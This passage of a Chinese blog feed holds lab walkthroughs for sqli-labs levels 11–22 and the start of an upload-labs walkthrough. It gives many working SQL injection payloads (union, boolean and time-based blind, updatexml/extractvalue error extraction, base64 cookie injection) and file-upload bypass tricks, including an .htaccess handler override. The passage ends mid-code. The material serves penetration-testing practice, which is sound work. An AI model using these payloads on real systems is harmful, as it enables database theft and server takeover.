title="post注入"></a>post注入</h3><p>不能使用–+注释符,因为抓包发现加号被编码成%2B了。</p><p>可以用#，减减空格（空格被编码成了+）</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>在username的输入框输入：1’ </p><p>出现如下报错信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">''</span>1<span class="token string">''</span> and password<span class="token operator">=</span><span class="token string">''</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’1’’</p><p>在源码中可能为 username=’$uname’</p><p>在Less-11的index.php中：</p><pre class="line-numbers language-bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试：1’ or 1=1#</p><p>可以登录成功：</p><p> <img src="/posts/bb32/11.png" class></p><h3 id="11-1获取用户名"><a href="#11-1获取用户名" class="headerlink" title="11.1获取用户名"></a>11.1获取用户名</h3><p>①payload:</p><p>在username的输入框输入：</p><pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到当前数据库用户名为root@localhost:</p><p>  <img src="/posts/bb32/11_2.png" class></p><p>或者：</p><p>②payload：</p><p>在username的输入框输入：</p><pre class="line-numbers language-bash"><code class="language-bash">1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="11-2获取数据库名"><a href="#11-2获取数据库名" class="headerlink" title="11.2获取数据库名"></a>11.2获取数据库名</h3><p>payload:</p><p>在username的输入框输入：</p><pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到数据库名为security:</p><p>   <img src="/posts/bb32/11_3.png" class></p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>通过测试，输入1”可以看到报错信息。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"") and password=("") LIMIT 0,1'</span> at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：在源代码中可能为username=(“$uname”)的形式。</p><p>使用payload:</p><pre class="line-numbers language-bash"><code class="language-bash">1"<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到页面返回正确的信息。</p><p>其他的payload就跟十一关差不多，只需要将十一关的’改为”)即可。</p><h1 id="盲注（Less-13-Less-17-POST）"><a href="#盲注（Less-13-Less-17-POST）" class="headerlink" title="盲注（Less-13~Less-17 POST）"></a>盲注（Less-13~Less-17 POST）</h1><h2 id="Less-13-基于布尔型的盲注"><a href="#Less-13-基于布尔型的盲注" class="headerlink" title="Less-13 基于布尔型的盲注"></a>Less-13 基于布尔型的盲注</h2><p>输入1’，出现如下错误信息提示：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">''</span>1<span class="token string">''</span><span class="token punctuation">)</span> and password<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明:在源代码中可能为username=(‘$uname’)的形式。</p><pre class="line-numbers language-bash"><code class="language-bash">使用payload：1'<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面出现成功提示，但是不像第十一关和第十二关那样出现用户的账号和密码。</p><h3 id="（1）可以采用基于布尔型的盲注"><a href="#（1）可以采用基于布尔型的盲注" class="headerlink" title="（1）可以采用基于布尔型的盲注"></a>（1）可以采用基于布尔型的盲注</h3><h4 id="猜测当前数据库用户名："><a href="#猜测当前数据库用户名：" class="headerlink" title="猜测当前数据库用户名："></a>猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">') or if(substr(user(),1,1)='</span>r<span class="token string">',1,0)#或者可用like匹配：1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">((</span>select user<span class="token punctuation">(</span><span class="token punctuation">)</span> like <span class="token string">'r%'</span><span class="token punctuation">)</span>,1,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用burp抓包，对标红的两个变量进行测试，爆破出当前用户名为root@localhost:</p><p>   <img src="/posts/bb32/13.png" class></p><p>跟第五关的基于布尔型的盲注差不多。就不重复写了。</p><h3 id="（2）可以采用报错注入"><a href="#（2）可以采用报错注入" class="headerlink" title="（2）可以采用报错注入"></a>（2）可以采用报错注入</h3><h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1'<span class="token punctuation">)</span> or info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示出了数据库名：</p><p> <img src="/posts/bb32/13_2.png" class></p><h4 id="②获取当前数据库用户名："><a href="#②获取当前数据库用户名：" class="headerlink" title="②获取当前数据库用户名："></a>②获取当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到用户名：</p><p>  <img src="/posts/bb32/13_3.png" class></p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>输入1”，出现如下错误信息提示：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"" and password="" LIMIT 0,1'</span> at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明:在源代码中可能为username=”$uname”的形式。</p><pre class="line-numbers language-bash"><code class="language-bash">使用payload：1" or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面出现成功提示，但也不显示用户名和密码信息，跟第十三关一样，</p><h3 id="（1）采用基于布尔型的盲注。"><a href="#（1）采用基于布尔型的盲注。" class="headerlink" title="（1）采用基于布尔型的盲注。"></a>（1）采用基于布尔型的盲注。</h3><p>只需将第十三关的payload的’)改成”即可。</p><h3 id="（2）采用报错注入。"><a href="#（2）采用报错注入。" class="headerlink" title="（2）采用报错注入。"></a>（2）采用报错注入。</h3><p>也只需将第十三关的payload的’)改成”即可。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>使用1’ or 1=1#能显示登录成功的信息</p><p>说明在源码中可能为username=’$uname’的形式</p><p>本关不会显示报错信息，采用基于布尔型的盲注或者延时注入。</p><h3 id="（1）基于布尔型的盲注"><a href="#（1）基于布尔型的盲注" class="headerlink" title="（1）基于布尔型的盲注"></a>（1）基于布尔型的盲注</h3><h4 id="①猜测当前数据库用户名："><a href="#①猜测当前数据库用户名：" class="headerlink" title="①猜测当前数据库用户名："></a>①猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or substr(user(),1,1)='</span>r'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将r替换成其他的字母，成功时显示成功页面，否则是登录失败界面</p><p>或者用like匹配：</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' or user() like '</span>r%'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="②猜测数据库名"><a href="#②猜测数据库名" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or substr(database(),1,1)='</span>s'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将s替换成其他的字母，成功时显示成功页面，否则是登录失败界面</p><p>或者用like匹配：</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' or database() like '</span>s%'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（2）延时注入"><a href="#（2）延时注入" class="headerlink" title="（2）延时注入"></a>（2）延时注入</h3><h4 id="①猜测当前数据库用户名：-1"><a href="#①猜测当前数据库用户名：-1" class="headerlink" title="①猜测当前数据库用户名："></a>①猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果字符正确，则延时五秒返回，否则返回登录失败的界面。</p><h4 id="②猜测数据库名-1"><a href="#②猜测数据库名-1" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or if(substr(database(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果字符正确，则延时五秒返回，否则返回登录失败的界面。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>通过猜测，使用1”) or 1=1#能显示登录成功的信息。</p><p>说明在源码中可能为username=(“$uname”)的形式。</p><p>本关不会显示报错信息，采用基于布尔型的盲注或者延时注入。</p><p>本关的payload跟第十五关的一样，只需要将第十五关的’换成”)即可。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>本关是一个修改密码的过程。在尝试的过程中，要输入一个正确的账号，如admin，然后在重置密码框测试。</p><p>密码框输入’时，出现如下的报错信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'admin'</span>' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明在源码中可能为’$uname’的形式。</p><h3 id="使用报错注入："><a href="#使用报错注入：" class="headerlink" title="使用报错注入："></a>使用报错注入：</h3><h4 id="①猜测当前数据库用户名"><a href="#①猜测当前数据库用户名" class="headerlink" title="①猜测当前数据库用户名"></a>①猜测当前数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">' and extractvalue(1,concat(0x7e,(select user()),0x7e))#或者：1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/17.png" class></p><h4 id="②猜测数据库名-2"><a href="#②猜测数据库名-2" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#或者：  1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/17_2.png" class></p><h1 id="HTTP头部插入-Less-18-Less22"><a href="#HTTP头部插入-Less-18-Less22" class="headerlink" title="HTTP头部插入(Less-18~Less22)"></a>HTTP头部插入(Less-18~Less22)</h1><h2 id="Less-18-基于错误的用户代理，头部POST注入"><a href="#Less-18-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 基于错误的用户代理，头部POST注入"></a>Less-18 基于错误的用户代理，头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>  <img src="/posts/bb32/18.png" class></p><p>可以抓包修改User-Agent的内容试试：</p><p>将User-Agent里面的内容随便填写，可以看到显示出了我们输入的内容：</p><p>  <img src="/posts/bb32/18_2.png" class></p><p>此时可以在User-Agent中构造注入语句。</p><h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/bb32/18_3.png" class> </p><h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/18_4.png" class></p><h2 id="Less-19-基于头部的Referer-POST报错注入"><a href="#Less-19-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 基于头部的Referer POST报错注入"></a>Less-19 基于头部的Referer POST报错注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>  <img src="/posts/bb32/19.png" class></p><p>这题的思路跟第十八关差不多，只是将User-Agent换成Referer。</p><p>用burp抓包，修改一下Referer的内容看看：</p><p>  <img src="/posts/bb32/19_2.png" class></p><p>的确显示为被修改的内容了，然后在Referer中构造注入语句。</p><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/19_3.png" class></p><p>②获得数据库名</p><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">' or (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/bb32/19_4.png" class> </p><h2 id="Less-20-基于错误的cookie头部POST注入"><a href="#Less-20-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 基于错误的cookie头部POST注入"></a>Less-20 基于错误的cookie头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>  <img src="/posts/bb32/20.png" class></p><p>可以考虑在cookie中添加注入语句。</p><p>Burp抓包：</p><p>因为是cookie，之前没有登录过，所以没有值，我们将请求发送给自己，然后可以获得cookie值：</p><p>  <img src="/posts/bb32/20_2.png" class></p><p>点击两次发送，能获得cookie值，然后发送到重发器，再从里面添加注入语句。</p><h3 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/20_3.png" class></p><h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/20_4.png" class></p><h2 id="Less-21-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21  基于错误的复杂的字符型Cookie注入"></a>Less-21  基于错误的复杂的字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>   <img src="/posts/bb32/21.png" class></p><p>跟第二十关差不多，只是将账号用base64加密了。并且只是对uname是进行了(‘uname’)的处理。</p><h4 id="①获得数据库用户名-3"><a href="#①获得数据库用户名-3" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHVzZXIoKSksMHg3ZSksMSkpIw<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/21_2.png" class></p><h4 id="②获得数据库名-2"><a href="#②获得数据库名-2" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpKSM<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/21_3.png" class></p><h2 id="Less-22-基于错误的双引号字符型Cookie注入"><a href="#Less-22-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 基于错误的双引号字符型Cookie注入"></a>Less-22 基于错误的双引号字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>   <img src="/posts/bb32/22.png" class></p><p>跟第二十关差不多，将账号用base64加密了，并且是对uname是进行了”uname”的处理。</p><h4 id="①获得数据库用户名-4"><a href="#①获得数据库用户名-4" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：uname<span class="token operator">=</span>Dumb" or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcigpKSwweDdlKSwxKSkj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/22_2.png" class></p><h4 id="②获得数据库名-3"><a href="#②获得数据库名-3" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb" or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>dW5hbWU9RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkpIw<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/22_3.png" class></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload文件上传靶场</title>
      <link href="/posts/1702.html"/>
      <url>/posts/1702.html</url>
      
        <content type="html"><![CDATA[<p>这段时间看了一下文件上传漏洞的知识点，然后把upload的靶场打完了，记录了一下过关的路程。文章最后还有一张我对于文件上传漏洞的总结哦。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我用的这个文件上传的靶场，是c0ny1的upload-labs。下载地址贴一下：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>听我学长的话，咱下载完成一个东西后，先看看它的readme文档或者其他要求的文档。</p><p>这个靶场的php环境推荐5.2.17，那我就乖乖把我的php调到这个版本，然后开始打靶场罗。</p><h1 id="1、PASS-01——js绕过"><a href="#1、PASS-01——js绕过" class="headerlink" title="1、PASS-01——js绕过"></a>1、PASS-01——js绕过</h1><p>上传php后缀文件时，弹出不允许上传，查看源代码，发现这是前端js拦截。</p><img src="/posts/1702/1.png" class><p>那就先上传一个正常的11.jpg，然后用burp抓包将11.jpg改成22.php就可以啦。修改点击发送，发现已经上传成功啦。</p><img src="/posts/1702/1_2.png" class><h1 id="2、PASS-02——content-type检测绕过"><a href="#2、PASS-02——content-type检测绕过" class="headerlink" title="2、PASS-02——content-type检测绕过"></a>2、PASS-02——content-type检测绕过</h1><p>上传2.php时，提示文件类型不正确，查看源码，发现对content-type做了限制。</p><p>那就先上传2.php，然后用burp抓包，将content-type改成其中一个合法的就行。</p><p>抓包获取到的：</p><img src="/posts/1702/2.png" class><p>修改成合法的（image/jpeg或image/png或image/gif）：</p><img src="/posts/1702/2_2.png" class><p>上传成功：</p><img src="/posts/1702/2_3.png" class><h1 id="3、PASS-03——其他后缀名绕过"><a href="#3、PASS-03——其他后缀名绕过" class="headerlink" title="3、PASS-03——其他后缀名绕过"></a>3、PASS-03——其他后缀名绕过</h1><p>上传2.php,发现出现提示信息：</p><img src="/posts/1702/3.png" class><p>这很有可能是设置了黑名单，查看一下源代码。</p><p>既然源代码中只设置了这几种可执行后缀的黑名单，那就直接尝试上传其他可执行后缀的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'.asp'</span>,<span class="token string">'.aspx'</span>,<span class="token string">'.php'</span>,<span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传2.php3文件，抓包，可显示图片路径，成功上传：</p><img src="/posts/1702/3_2.png" class><h1 id="4、PASS-04——-htaccess解析绕过"><a href="#4、PASS-04——-htaccess解析绕过" class="headerlink" title="4、PASS-04——.htaccess解析绕过"></a>4、PASS-04——.htaccess解析绕过</h1><p>上传php文件，查看源代码，发现还是设置了黑名单，只是这次好像把能禁用的后缀都禁用掉了：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".php1"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".pHp1"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现它没有禁止上传.htaccess后缀，那就尝试上传这个，</p><p>.htaccess的内容为(.htaccess不能起名字，它就是.htaccess文件)：</p><pre class="line-numbers language-bash"><code class="language-bash">SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(代码意思：无论上传哪种类型的文件，他就会被解析为.php)</p><p>Burp抓包，将.htaccess文件修改成1.jpg，里面的内容写上php代码，点击发送：</p><img src="/posts/1702/4.png" class><img src="/posts/1702/4_2.png" class><p>此时，访问1.jpg就会转换成php文件：</p><img src="/posts/1702/4_3.png" class><h1 id="5、PASS-05——点空格点绕过"><a href="#5、PASS-05——点空格点绕过" class="headerlink" title="5、PASS-05——点空格点绕过"></a>5、PASS-05——点空格点绕过</h1><p>上传一个php代码，显示此文件类型不允许上传。查看源代码，黑名单限制，这题把.htaccess后缀也限制了。感觉都被限制了呀，但好像那些限制条件都只限制了一次，先去除文件后缀点再去除空格。若此时设置为文件名点空格点（即2.php. .），删掉一个点一个空格，还剩下2.php.</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点 <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写 <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token 